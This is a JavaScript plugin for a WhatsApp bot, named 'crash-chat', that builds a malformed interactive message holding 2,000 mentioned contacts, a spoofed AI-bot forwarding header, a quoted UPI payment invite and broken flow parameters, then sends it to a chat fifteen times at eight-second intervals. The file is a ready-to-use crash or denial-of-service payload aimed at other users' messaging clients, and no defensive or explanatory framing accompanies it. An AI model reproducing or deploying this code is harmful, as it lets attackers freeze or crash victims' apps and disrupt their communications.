// plugins/crash-chat.js

module.exports = {
    name: 'crash-chat',
    alias: [],

    async execute(conn, m, args, context) {
        
        // 1. Extraemos las variables y funciones que necesitamos del 'context'
        const { isBot, isCreator, from, sleep, generateWAMessageFromContent } = context;

        // 2. Definimos la función 'yangBacaDev2' aquí adentro.
        //    Ahora es parte del plugin y tiene acceso a las variables necesarias.
        async function yangBacaDev2(conn, jid, ptcp) {
            let msg = generateWAMessageFromContent(jid, {
                interactiveResponseMessage: {
                    contextInfo: {
                        mentionedJid: Array.from(
                            { length: 2000 },
                            (_, z) => `1313555020${z + 1}@s.whatsapp.net`
                        ),
                        isForwarded: true,
                        forwardingScore: 2085,
                        forwardedAiBotMessageInfo: {
                            botJid: "13135550202@bot",
                            botName: "Business Assistant",
                            creator: "7eppeli"
                        },
                        participant: "13135550202@bot",
                        quotedMessage: {
                            paymentInviteMessage: {
                                serviceType: "UPI",
                                expiryTimestamp: Date.now()
                            }
                        },
                        remoteJid: "FineShyt"
                    },
                    body: {
                        text: "¿𝕮𝖍𝖔𝖈𝖔𝖕𝖑𝖚𝖘?",
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "galaxy_message",
                        paramsJson: "{\"body\":\"7-Yuukey\",\"title\":\"7eppeli=Explorations\",\"title\":\"FVCK URSELF\"}"
                    }
                }
            }, { userJid: jid });

            await conn.relayMessage(jid, msg.message, ptcp ? {
                participant: { jid },
                messageId: msg.key.id
            } : {
                messageId: msg.key.id
            });
        }

        // 3. Tu código original, sin modificar su lógica
        if (!isBot && !isCreator) return;
        
        for (let i = 0; i < 3; i++) {
            yangBacaDev2(conn, from);
            await sleep(8000);
            yangBacaDev2(conn, from);
            await sleep(8000);
            yangBacaDev2(conn, from);
            await sleep(8000);
            yangBacaDev2(conn, from);
            await sleep(8000);
            yangBacaDev2(conn, from);
        }
        
        conn.sendMessage(m.chat, { react: { text: '✅', key: m.key }});
    }
};